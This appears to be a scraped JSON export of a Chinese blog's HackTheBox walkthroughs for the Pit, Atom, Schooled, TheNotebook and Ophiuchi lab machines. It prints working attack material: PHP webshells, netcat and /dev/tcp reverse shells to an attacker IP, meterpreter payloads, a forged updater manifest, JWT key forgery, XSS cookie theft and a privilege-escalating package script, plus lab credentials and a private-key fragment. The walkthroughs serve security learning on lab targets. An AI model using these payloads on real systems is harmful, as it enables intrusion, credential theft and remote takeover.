zYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\\\n-----END OPENSSH PRIVATE KEY-----\\\\n&quot; &gt; id\\_rsa 即可获得我们的密钥，通过上面的方式咱们自己获得也可以 这里添加A记录以后，咱们去尝试ssh登录 成功拿到bindmgr账户权限 成功获得user权限flag 权限提升 咱们使用sudo -l查看一下sudo权限 发现可以执行bindmgr.sh文件，咱们先去看一下 这里咱们检查一下.version文件兵使用通配符*复制所有内容 find / -name &quot;.version&quot; 2&gt;/dev/null 我们可以看到，.version在&#x2F;etc&#x2F;文件夹中，所有这个文件会在哪里运行 这里我们要做的事创建.version文件并添加42到它里面 echo 42 &gt; .version 首先我们复制&#x2F;bin&#x2F;bash到当前目录并使其成为SUID二进制文件 cp /bin/bash . chmod +s bash ls -la 下面图片错了，请见谅 我们创建一个名为–preserve&#x3D;mode的文件来利用它，同时复制它会保留这个目录中文件的属性，就像bash有SUID所以它会保留那些属性并将其复制到&#x2F;etc&#x2F;bind&#x2F;named.bindmgr为root权限 echo &gt; --preserve=mode ls -la 现在只需要运行sudo脚本 sudo /usr/local/bin/bindmgr.sh 执行.&#x2F;bash -p即可提权 cd /etc/bind/named.bindmgr ./bash -p 成功拿到root权限的flag 收工睡觉","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Pit - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Pit","date":"2021-06-11T11:38:36.000Z","updated":"2023-06-13T03:48:55.000Z","comments":true,"path":"2021/06/11/Hackthebox/Medium/Hackthebox-Pit/","link":"","permalink":"http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/","excerpt":"","text":"Hackthebox - PitHackthebox - Pit 靶场实战 靶场信息 靶场类型 信息搜集 首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.241 我们可以看到，该靶场开启了22、80、9090端口 并且有一个一个域名dms-pit.htb，咱们将它加入hosts里 vim &#x2F;etc&#x2F;hosts 首先我们访问一下pit.htb看看 就是一个Nginx的初始页面，没什么看的意义 接着咱们看看dms-pit.htb 啊这，直接403，也不用看，那咱们去看看9090端口吧 好像是一个CentOS的在线管理页面，但是咱们也没密码啊 经过大量的目录搜集以后，我发现还是没什么有用的信息，没办法了呀，只能去官方论坛看看大佬们的提示了 大佬说在官方推特会有一个很好的提示，那咱们去找找看吧 官方提示在WALK 所以咱们扫描一下这台机器的snmp开放端口吧 nmap -sU 10.10.10.241 我们发现了他的SNMP版本 我们可以使用以下脚本来进行扫描 https://github.com/dheiland-r7/snmp 这里我们成功获得了内核版本、目录、用户名 目前信息获取搜集到这里，我们还是没有进一步的办法，咋办呢 在我翻找10.10.10.241.snmp文件的时候，发现了一行 这显然是一个目录啊，根据目录来构造，URL应该为http://localhost/seeddms51x/seeddms/，让咱们去尝试一下 确认了URL为http://dms-pit.htb/seeddms51x/seeddms/ 然后需要账号密码，那还得去找找snmp文件 发现了两个账户 root和michelle，咱们去尝试一下 测试后发现账号密码为michelle，既是账号，也是密码 漏洞利用 这里咱们可以看到所使用的是SeedDMS，然后去搜索一下有没有相关的漏洞 其中第四个是我们要的漏洞，咱们打开看一下 cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;47022.txt CVE-2019-12744 这个漏洞的意思呢是 登录应用程序并在任何文件夹下添加文档 选择文件作为简单的php后门文件或任何后门webshell都可以使用 上传后检查与文档对应的文档ID 访问example.com&#x2F;data&#x2F;1048576&#x2F;“document_id”&#x2F;1.php?cmd&#x3D;cat+&#x2F;etc&#x2F;passwd以在浏览器中利用 第一步，在本地任意创建一个php文件，内容如下 “; $cmd &#x3D; ($_REQUEST[‘cmd’]); system($cmd); echo “”; die; } ?&gt; 第二步，登录后台后，依次点击 Docs -&gt; Users -&gt; Michelle -&gt; Add document 第三步，上传php马 第四步，复制php马的连接 http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=44&showtree=1 从上我们可以得知文档ID为44，然后我们构造poc http://dms-pit.htb/data/1048576/44/1.php?cmd=cat+/etc/passwd http://dms-pit.htb/seeddms51x/data/1048576/44/1.php?cmd=cat+/etc/passwd 成功利用该漏洞 该shell会五分钟删除一次，如果被删除了大家重新上传一次即可 咱们查看一下conf&#x2F;settings.xml文件 http://dms-pit.htb/seeddms51x/data/1048576/45/1.php?cmd=cat%20../../../conf/settings.xml 打开后会发现这是一个空白页面，咱们查看一下源文件 成功拿到数据库账号密码 seeddms ied^ieY6xoquu 咱们可以看到，数据库账号密码并没有在系统账户里，也就是说无法直接利用ssh进行登录，应该怎么办呢？突然想到，咱们9090端口不是需要一个账号密码嘛，咱们去试试 经过测试，账号是michelle，密码是ied^ieY6xoquu OK，咱们成功登录 突然，我的眼光就被“终端”两个字吸引了 咱们这就直接从nginx权限，拿到了一个users的权限 成功获得user权限的flag 权限提升 咱们继续把目光放在snmp文件上 在经过确认后，我把眼光放在了这一行上，咱们去看看这个文件 这是一个bash脚本，感觉可能有用，先记录上 上面的脚本显示了从另一个位置运行了脚本，咱们一步步跟过去看看 ls -la &#x2F;usr&#x2F;local&#x2F;monitoring&#x2F; 无法列出，应该是权限不足，咱们看看该目录的权限 咱们对这个目录有读、写、执行以及+权限 也就是有权限扩展，让咱们查看一下 从上面可以解读出，该目录属于root用户，其他用户有所有权限，但michelle用户只有写入和执行权限 让我们创建一个文件来找出想要的东西 成功了 创建一个sh文件，填入公钥，然后上传到服务器 本地使用python3开启一个http服务器 python3 -m http.server 80 在终端中使用curl进行下载 curl http://10.10.14.236/check.sh -o check.sh 然后拷贝到&#x2F;usr&#x2F;local&#x2F;monitoring&#x2F;目录下 cp check.sh &#x2F;usr&#x2F;local&#x2F;monitoring&#x2F; root账户正运行着一个脚本，监控目录的内容然后在五分钟后删除 把我们的shell放进去后，我们需要在本地运行SNMPwalk应用程序执行它 snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects 然后咱们使用ssh进行连接 ssh -i lucifiel root@10.10.10.241 如果这里提示&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#48;&#46;&#x31;&#x30;&#x2e;&#49;&#48;&#46;&#x32;&#52;&#49;: Permission denied (publickey,gssapi-keyex,gssapi-with-mic). 则是snmpwalk的问题，输入sudo apt-get install snmp-mibs-downloader进行重新安装即可 成功拿到root权限的flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Atom - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Atom","date":"2021-06-05T11:38:36.000Z","updated":"2023-06-13T03:40:03.000Z","comments":true,"path":"2021/06/05/Hackthebox/Medium/Hackthebox-Atom/","link":"","permalink":"http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/","excerpt":"","text":"Hackthebox - Atom靶场信息 靶场类型 信息搜集Nmap首先使用NMAP进行端口扫描 Smb我们可以看到，这台靶场开启了80 135 443 445端口，以及有SMB服务 且SMB服务可以由guest权限登录，那咱们就先看看smb有啥吧 smbclient -L ////10.10.10.237//// 密码为空即可 看看我们可以匿名阅读的内容有哪些 smbmap -u &#39;anonymous&#39; -p &#39;&#39; -H 10.10.10.237 看来可以匿名读写Software_Updates目录 smbclient [\\\\\\\\10.10.10.237\\\\Software_Updates](file:///////10.10.10.237//Software_Updates) 登录 然后使用dir查看 看来UAT_Testing_Procedures.pdf文档可以被下载，咱们使用get进行下载 我们可以看到，该文档描述了一个名为Heed的笔记应用，它是一个基于客户端的应用程序，没有与服务器交互。但是它确实通过客户端文件夹进行了更新，我们可以看到已经有三个文件夹了，分别是client1、client2、client3，所以我们接下来访问80端口 我们往下翻滚，可以看到一个下载按钮和一个邮箱&#x4d;&#114;&#x52;&#51;&#x62;&#111;&#111;&#116;&#64;&#x61;&#x74;&#x6f;&#x6d;&#x2e;&#x68;&#x74;&#x62; 既然域名都给了，那还是老规矩，添加hosts吧 vim /etc/hosts Gobuster既然都添加了，那目录爆破和子域名爆破就不能少了，爆破吧 gobuster爆破目录 gobuster dir -u &quot;http://10.10.10.237/&quot; -x php,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt gobuster爆破DNS gobuster dns -d &#39;atom.htb&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 简单爆破了一下，好像都没啥有用的东西，那咱们只能去下载了 下载下来后是一个exe程序，这就不得不切换一台windows的机器出来了 安装好后是酱婶儿的 这告诉我们这是一个电子应用程序 通过Googles搜索rce程序 https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html Juliano Rizzo 这里提到了是由这位大佬发现的漏洞，感谢 这里说它将从latest.yml进行更新 漏洞利用首先我们生成带有单引号的有效负载 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.184 LPORT=4444 -f exe &gt; &quot;u&#39;payload.exe&quot; 现在我们需要生成一个 sha512 sum hash 并将其转换为十六进制，然后进一步转换为base64 shasum -a 512 &quot;u&#39;payload.exe&quot; | cut -d &quot; &quot; -f1 | xxd -r -p | base64 kPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg== 创建latest.yml文件 version: 1.0.1 path: http://10.10.14.184/u&#39;payload.exe sha512: kPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg== 使用python3开启一个http服务器 python3 -m http.server 80 替换掉smb共享中的yml文件 三个文件夹都要替换 use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp 使用msfconsole开启监听 配置好配置项后exploit执行 我们可以看到 http服务器里已经收到了GET请求 然后我们再去看看MSF 已经成功getshell了 如果没有弹回shell，就多尝试几次，或使用1.2.3版本号 权限提升 为了提权，我先输入了getprivs查看当前用户的权限 输入shell进入shell控制 首先进入Program Files目录 然后进入Redis目录 然后我们看到redis的配置文件 redis.windows-service.conf 我们可以看到，里面有redis cli的密码kidvscat_yes_kidvscat 然后咱们发现这台靶机的6379端口 也就是redis服务开着呢，那就直接登录吧 登录成功，并使用info进行信息查看 使用keys *列出所有hash e8e29158-d70d-44b1-a1ba-4949d52790a0 查看user用户的相关信息 get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 我们得到了一个管理员的hash Odh7N3L9aVQ8&#x2F;srdZgG2hIR0SSJoJKGi 同时我们在用户jason的桌面发现了一个user.txt 成功拿到user权限的flag 在检查其他文件的时候，找到了两个文件夹，咱们进去看看 这里似乎没什么有用的东西，咱们看看另一个文件夹 这个程序引起了我的兴趣，然后去Google了一下 https://www.exploit-db.com/exploits/49409 然后找到了一个exp 可能。。。这就是缘分吧？ 咱们查看一下配置文件Portablekanban.cfg 获得了portablekanban的hash值 Odh7N3L9aVSeHQmgK&#x2F;nj7RQL8MEYCUMb 这时候开动我们机灵的小脑瓜，动起我们勤劳的小手，小小的修改一下exp import json import base64 from des import * #python3 -m pip install des import sys def decode(hash): hash = base64.b64decode(hash.encode(&#39;utf-8&#39;)) key = DesKey(b&quot;7ly6UznJ&quot;) return key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode(&#39;utf-8&#39;) print(decode(&#39;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#39;)) 执行一下这个脚本 成功得到Administrator的密码kidvscat_admin_@123 我们可以看到5985端口是开启的 别问我怎么知道，因为思路卡壳的我，想了一晚上 NB吗？用头发换的 经过Google，我们发现5985端口是WinRM程序使用的端口 那咱们就根据文档来利用吧 注意，在kali中安装winrm的指令是 gem install evil-winrm 安装好后使用evil-winrm进行登录 evil-winrm -i 10.10.10.237 -u &#39;administrator&#39; -p &#39;kidvscat_admin_@123&#39; 成功拿到root权限的flag 收工睡觉","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Schooled - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Schooled","date":"2021-06-04T11:38:36.000Z","updated":"2023-06-13T03:49:54.000Z","comments":true,"path":"2021/06/04/Hackthebox/Medium/Hackthebox-Schooled/","link":"","permalink":"http://www.lucifiel.com/2021/06/04/Hackthebox/Medium/Hackthebox-Schooled/","excerpt":"","text":"Hackthebox - SchooledHackthebox - Schooled 靶场实战 靶场信息 靶场类型 信息搜集 首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.234 我们可以看到，这台靶机开启了22和80端口，咱们的目光依然放到80端口上 首先访问一下80端口的http服务 在底部看到一个schooled.htb，那估计是要解析了，咱们直接先加上吧 在手动浏览以及dirb目录爆破的时候，都没有在web页面中找到啥有趣的东西 咱们结合一下上面看到的提示有一个schooled.htb域名以后，突然来了思路 这不就跟咱们做的Love那一台差不多吗？都是得从子域名入手 所以这个时候使用wfuzz工具进行fuzz 咱们这里发现有很多461行的相应，这明显是不对的，咱们把461行的相应屏蔽掉 wfuzz -c -u “http://schooled.htb/&quot; -H “Host:FUZZ.schooled.htb” -w &#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-5000.txt –hl 461 咱们找到一个moodle子域名 咱们先修改一下hosts解析 去访问一下http://moodle.schooled.htb/ 在这里咱们找到了几个老师的名字 数学老师：Jamie Borham 科学老师：Lianne Carter 信息技术：Jane Higgins 英语老师：Manuel Phillips 然后除了老师的名字和找到了登陆点以外，就没什么有意思的东西了 咱们首先创建个账号，错误有点多，咱们挨个解决 可算是注册好了，还挺麻烦 随便浏览了一下，发现我们只能报数学课（吐槽一下垃圾抢课系统，还好我不用） 我们还能看到老师的简介 我们发现老师有发布一条帖子，我用我的小学三年级靠个位数的天才英语给大家翻译一下 大概意思就是，这是一门自学课程（要老师干啥？），参加我（这位老师）课程的学生，确保设置好了MoodleNet个人资料。没设置的开始课程以后，会被踢出这门课程，老师会挨个儿查看报名该课程的学生 各位在座的盲生，发现了华点没有？ Nice，突破点就在老师表示会挨个检查我们的资料，这不就是确定100%会点击我们的资料了吗？那想到了什么？没错！XSS！ 咱们修改好以后，可以看到老师上线了 哎嘿，经过测试，聊天框是可以用xss的 但却是一个反射型xss（国内某平台都不收的垃圾洞，吐槽一下），但是咱们证明了该网站是存在XSS的。结合我们之前的猜测，应该是在MoodleNet处插入xss 漏洞利用 https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md 这是我使用的xss cookie脚本，大家有习惯使用的也可以用自己的 咱们修改好脚本后使用python启动 image 然后在MoodleNet处插入我们的xss代码 咱们插入后保存，可以看到自己的cookie已经过来了，咱们挂着去听会儿音乐，老师的cookie就过来 好了，咱们已经成功钓到老师的cookie了 将咱们的cookie替换为老师的cookie 然后刷新 可以看到，已经成功进入老师的权限了 https://moodle.org/mod/forum/discuss.php?d=407393 我们在查找漏洞的时候，发现了这个CVE-2020-14321。 课程中的教师可以把自己的身份更改为经理，也就是越权 现在我们来进行又一次的越权吧 随便选择一个人，然后抓包，然后提交 成功抓到包了 咱们在介绍页面，发现Lianne Carter是一名经理，OK 那就越她 userlist改为24，因为咱们也是越权到老师的账号，所以要修改为老师的ID，而24就是老师的ID，roletoassign处是记录的权限，1为经理，咱们修改为1以后点击send 刷新以后，咱们可以看到，权限已经变成了经理 然后把Lianne Carter添加到学生里，这样我们就能看到 Lianne Carter了。 我之前就是没添加，在这卡了好久，靶机重置了三次 咱们点击Lianne Carter并登入该账号 咱们点击登录 然后咱们在最底下可以看到site administration 咱们点击 接下来咱们按照RCE里的套路跟着走就行 咱们在点save changes之前，记得抓包 然后替换RCE里的包 看来RCE执行成功了 上传咱们的EXP 访问http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block\\_rce.php?cmd=id 成功拿到一个webshell 本地使用nc监听端口 nc -nvlp 4444 执行nc反弹shell rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i |nc 10.10.14.184 4444 &gt; &#x2F;tmp&#x2F;f http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd&#x3D;rm%20&#x2F;tmp&#x2F;f;mkfifo%20&#x2F;tmp&#x2F;f;cat%20&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh%20-i%20|nc%2010.10.14.184%204444%20%3E%20&#x2F;tmp&#x2F;f 成功使用nc反弹shell 权限提升 咱们使用pwd查看一下当前位置，发现是在apache目录下 也就是说，咱们拥有apache目录的权限 那就直接读取apache的配置文件吧 首先查找配置文件地址 find &#x2F; -name “config.php” 2&gt;dev&#x2F;null cat &#x2F;usr&#x2F;local&#x2F;www&#x2F;apache24&#x2F;data&#x2F;moodel&#x2F;config.php 然后使用cat查看配置文件 我发现这么做好像有一点问题，咱们去修改一下RCE https://github.com/LucifielHack/phpbash 咱们将里面的一句话木马修改为phpbash 成功得到账号密码 dbname &#x3D; model dbuser &#x3D; model dbpass &#x3D; PlaybookMaster2020 我想使用mysql进行登录，但输入mysql后发现无法使用？ 但上面已经看到了，使用了mysqli进行连接，那就肯定是存在mysql的。 但是为什么无法使用呢？我想应该是path里没有配置，咱们使用export查看一下 果然没有 然后我找了一下mysql的路径，咱们使用绝对路径来进行读取 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;mysql -u moodle -pPlaybookMaster2020 -e “use moodle;select * from mdl_user\\G” $2y$10$3D&#x2F;gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW 其中咱们需要关注的是Jamie的密码hash，为什么呢？因为在&#x2F;etc&#x2F;passwd里也有他 既然咱们拿到一个hash了，那么就请出咱们的老朋友 john 爆破成功 密码为 !QAZ2wsx 咱们去登录 ssh jamie@10.10.10.234 成功登录 成功拿到user权限flag 咱们使用sudo -l查看一下sudo权限 可以sudo权限安装pkg包 那不用说，提权思路肯定在这了 http://lastsummer.de/creating-custom-packages-on-freebsd/ 找到一篇参考文章，接下来咱们构造EXP包 #!&#x2F;bin&#x2F;sh STAGEDIR&#x3D;~&#x2F;stage rm -rf ${STAGEDIR} mkdir -p ${STAGEDIR} cat &gt;&gt; ${STAGEDIR}&#x2F;+PRE_DEINSTALL &lt;&lt;EOF careful here, this may clobber your systemecho “Resetting root shell” pw usermod -n root -s &#x2F;bin&#x2F;sh EOF cat &gt;&gt; ${STAGEDIR}&#x2F;+POST_INSTALL &lt;&lt;EOF careful here, this may clobber your systemecho “Registering root shell” chmod +s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;bash EOF cat &gt;&gt; ${STAGEDIR}&#x2F;+MANIFEST &lt;&lt;EOF name: mypackage version: “1.0_5” origin: sysutils&#x2F;mypackage comment: “automates stuff” desc: “automates tasks which can also be undone later” maintainer: &#106;&#111;&#x68;&#x6e;&#64;&#100;&#111;&#x65;&#46;&#x69;&#116; www: https://doe.it prefix: &#x2F; EOF mkdir -p ${STAGEDIR}&#x2F;usr&#x2F;local&#x2F;etc echo “# hello world” &gt; ${STAGEDIR}&#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.conf echo “&#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.conf” &gt; ${STAGEDIR}&#x2F;plist pkg create -m ${STAGEDIR}&#x2F; -r${STAGEDIR}&#x2F; -p ${STAGEDIR}&#x2F;plist -o . python3 -m http.server 80 在本地开启一个http服务 然后在服务器上用wget下。。。 嗯？卧槽？失策了，居然没有wget 测试了一下，vim也没有，但是有vi和nano 看大家喜欢用那个，反正直接创建就好了 创建好后记得添加执行权限 chmod +x exploit.sh 然后我们安装它 sudo &#x2F;usr&#x2F;sbin&#x2F;pkg install –no-repo-update mypackage-1.0_5.txz 然后咱们使用SUID来攻击 bash -p 成功提权到root 成功获得root权限的flag 收工睡觉","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"TheNotebook - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-TheNotebook","date":"2021-06-03T11:38:36.000Z","updated":"2023-06-13T03:53:51.000Z","comments":true,"path":"2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/","link":"","permalink":"http://www.lucifiel.com/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/","excerpt":"","text":"Hackthebox - TheNotebook靶场信息 靶场类型 信息搜集 首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.230 我们可以看到，一共有三个端口22 80 10010，其中10010目前是关闭状态，所以咱们的突破口还是在80端口 进去后只有三个按钮 Home、Register、Login Home就是主页，所以咱们先创建一个账号试试 注册了一个名为Lucifiel的账号，提示我们在&#x2F;notes下可以查看到笔记，咱们先去看看 目前没有笔记，那就创建一个看看吧 嗯。。。暂时没什么可利用的，咱们来看看能不能找到管理员账号吧 先退出登录，然后登录的时候咱们测试一下 账号admin 提示密码错误 账号admin1 提示账户不存在 嗯。。。确定了admin账户存在，但是在使用top1000进行爆破后，并没有爆破出密码 漏洞利用 咱们登入刚才注册的Lucifiel账号，然后看看cookie 咱们可以看到auth下有三段base64的字段 咱们使用CyberChef进行解密，会发现第三段是乱码，咱们就解密前两段就好了 {“typ”:”JWT”,”alg”:”RS256”,”kid”:”http://localhost:7070/privKey.key&quot;} {“username”:”Lucifiel”,”email”:”&#x4c;&#117;&#x63;&#x69;&#102;&#x69;&#x65;&#x6c;&#x40;&#x65;&#x6d;&#97;&#105;&#108;&#46;&#99;&#111;&#x6d;“,”admin_cap”:false} 解密出来的内容，我们会发现，上面有一个JWT，我感觉这是突破口 https://jwt.io/introduction 直接搜索JWT 找到了一个官网并且有相关的介绍，我们发现JWT是一个JSON 网络令牌 JWT格式 headers.payload.signature 这就是咱们的突破口了，可算是找到了 漏洞利用 由于Headers和Payload是明文储存的，所以咱们先把这两项修改好 Headers &#x3D; {“typ”:”JWT”,”alg”:”RS256”,”kid”:”http://10.10.14.184/privKey.key&quot;} Payload &#x3D; {“username”:”Lucifiel”,”email”:”&#76;&#x75;&#99;&#105;&#102;&#105;&#101;&#x6c;&#x40;&#x65;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#x6d;“,”admin_cap”:1} 但是这里的signature也就是密钥却是加密的，咱们无法修改也无法读取，怎么办呢？当然是Google啦 https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9 ssh-keygen -t rsa -b 2048 -m PEM -f privKey.key Don’t add passphraseopenssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub cat privKey.key cat privKey.key.pub 经过Google搜索JWT密钥的生成放式，咱们找到了所需的命令 kali里生成 这就是咱们要的密钥了 -—BEGIN PUBLIC KEY—– MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnwiGXuFO1peifvmt2y08 U89mLgcwp+jxcXkp0&#x2F;qURF2N9ZqnIYp&#x2F;Jp6HuGJcqeeoJT&#x2F;DprtAJsCs6hWJ2Fdq nSPGs63Ig6OqGJQK&#x2F;dH2vt6EzQaXqRmkCeN9jwTTPmMr5xklcCtmBAGq8h4NY5LN PcB9GHudFyi8U&#x2F;Ae2f&#x2F;ED8koR&#x2F;AyG1ZdC6SvMv3tjOmkJ5Cax+jbGJMtUGEj4Xfa Na5kJxDSq8F4Z16&#x2F;I+4IO7&#x2F;cfQlVOMNZ09tvEjOAUxjaD8YkueIvyOHeIXhmEY7&#x2F; DF&#x2F;Tkoh7fpRt+9AWEbASZi&#x2F;p2m+DF9Ws&#x2F;K8MyXqNjpWhLrRDpeVLuOLd33V2BQ2w RwIDAQAB -—END PUBLIC KEY—– 咱们将headers和payload和进行base64，并且保存为JWT需要的格式headers.payload.signature eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xODQvcHJpdktleS5rZXkifQ.eyJ1c2VybmFtZSI6Ikx1Y2lmaWVsIiwiZW1haWwiOiJMdWNpZmllbEBlbWFpbC5jb20iLCJhZG1pbl9jYXAiOjF9.Q0kirAQPuqVJLtkhAa0pkrB11Dy0-tDm-8H9b3HDja7VWPc4mIiupMYzUzxAZamlA1xnUA_x1Btx4N7lcc09GdXZ0o9Ma-q_j-mPu2V-iFJ5hoYSZdL91bjqGMxp-oJ38pSMW4ulJzssuiRa6wl_C-8n9P4i6T0gqvLQjRUr8ksaLoM1WvU4SRjRN6EH_oFY_P9rTGilC2Vt1uogZ0UZGikDmXRXy74rH_-Bvkx8JcFgLgM5D4xPa5ayKFJ-jF-0vazUB8oUeKMr5za1vCbJXSBSNSosQ1MhkacUkEMnOllWNgYilbZR9t1p05vUnaT7ntbsYbILxb6fk4hVU1LyYA 脚本： import jwt key &#x3D; open(“privKey.key.pub”, ‘r’).read() headers &#x3D; {“typ”: “JWT”, “alg”: “RS256”, “kid”: “http://10.10.14.184/privKey.key&quot;} payload &#x3D; {“username”: “Lucifiel”, “email”: “&#76;&#x75;&#x63;&#x69;&#102;&#x69;&#x65;&#x6c;&#64;&#x65;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#109;“, “admin_cap”: 1} print(jwt.encode(payload, headers&#x3D;headers, key&#x3D;key, algorithm&#x3D;’RS256’)) 使用该脚本即可生成我们所需要的cookie 在咱们本地使用python3开启一个http服务器 python3 -m http.server 80 然后修改10.10.10.230靶场的cookie，然后刷新 咱们可以看到，成功越权，然后出现了一个按钮 admin panel 咱们访问 发现可以上传文件 我们可以看到，管理员创建了一个笔记，意思是可以上传php文件 https://github.com/Arrexel/phpbash 咱们上传一个php马上去 成功获得一个www-data权限的shell 权限提升 我们看管理员说存在backups备份文件 咱们再&#x2F;var&#x2F;backups&#x2F;目录下发现一个home.tar.gz文件，咱们在靶机上开启http服务把他搞下来 python3 -m http.server 8888 我们找到了noah用户的公钥和私钥 直接使用密钥登录，成功登录 成功拿到user权限的flag 咱们使用sudo -l查看一下sudo权限 发现可以使用docker运行webapp-dev01这个脚本 * 代表可以接受人和参数 直接su成功切换到root用户 sudo &#x2F;usr&#x2F;bin&#x2F;docker exec -it webapp-dev01 sh -c “su” 我以为事情到这里就结束了，毕竟咱们已经拿到root权限了，接下来就是找到flag就好了，但是在寻找flag的时候 发现root文件为空，再结合咱们所处的环境来进行判断，我不得不相信，我们居然是在一个docker里？所以现在还得进行docker逃逸？ 这个靶场，确实有难度的呀 docker逃逸 https://github.com/Frichetten/CVE-2019-5736-PoC 经过查询，发现docker exec是存在cve漏洞的 咱们可以直接利用 var payload &#x3D; “#! &#x2F;bin&#x2F;bash \\n bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.184&#x2F;4444 0&gt;&amp;1” 咱们下载下来后修改payload 修改好payload以后，咱们使用golang进行编译 然后上传到服务器内，在本地开启http服务 python3 -m http.server 80 在本地启动nc进行监听 上传后运行 第一个root权限运行脚本 第二个noah权限运行指令 成功获得root权限 成功得到root权限flag 最后总结：这台机器确实挺有难度的，我也是第一次碰到需要虚拟机逃逸的靶场。这台机器耗时两天，去掉睡觉和休息时间还有工作时间，耗时应该超过10小时，确实对得起这个难度。还是挺有意思的，学到了不少姿势，其中有一些玄学问题，请教了不少大佬 此处在这感谢我叮叮师傅@ loid 可算是做完了，这两天做的快脑溢血了，就是因为一天时间没有做出来，所以拖更了一天","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Ophiuchi - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Ophiuchi","date":"2021-06-01T11:38:36.000Z","updated":"2023-06-13T03:48:12.000Z","comments":true,"path":"2021/06/01/Hackthebox/Medium/Hackthebox-Ophiuchi/","link":"","permalink":"http://www.lucifiel.com/2021/06/01/Hackthebox/Medium/Hackthebox-Ophiuchi/","excerpt":"","text":"Hackthebox - Ophiuchi靶场信息 靶场类型 信息搜集Nmap首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.227 Http我们可以看到开启了22和8080端口，让我们访问8080端口看看 这是个啥？一个YAML在线解析器，让我们随便输入点东西试试 此功能已暂停，嗯。。。有点意思 我们先看看其他功能点，比如tomcat 版本为 Apache Tomcat 9.0.38 直接登录试试，万一有0day呢？（弱口令） [http://10.10.10.227:8080/manager](http://10.10.10.227:8080/manager) 咱们去登录试试 测试了几个默认口令均无效，看来还是得把目光放到YAML上了，去google找找资料吧 在搜索过程中，发现tomcat 9.0.38存在 Snake yaml 反序列化漏洞 YAML在线解析器具有java类构造函数的功能 OK，那思路就有了 漏洞利用使用python3在本地开启一个http服务器 python3 -m http.server 80 使用YAML解析命令 !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&quot;http://10.10.14.184/&quot;] ]] ] 点击解析看看 我们可以看到，虽然是失败，但确实&#x2F;META-INF&#x2F;services&#x2F;javax.script.ScriptEngineFactory 向我们的机器发出了请求 我们可以保持相同的文件结构来利用它，例如具有目录“META-INF”然后是 services 具有文件名的子目录 javax.script.ScriptEngineFactory，在该文件中，我们将调用我们的exploit 创建一个文件，exploit.java 可以从这里获取java代码，然后我们将尝试ping我们的本地机器以查看exploit是否有效，以便我们获得反向shell 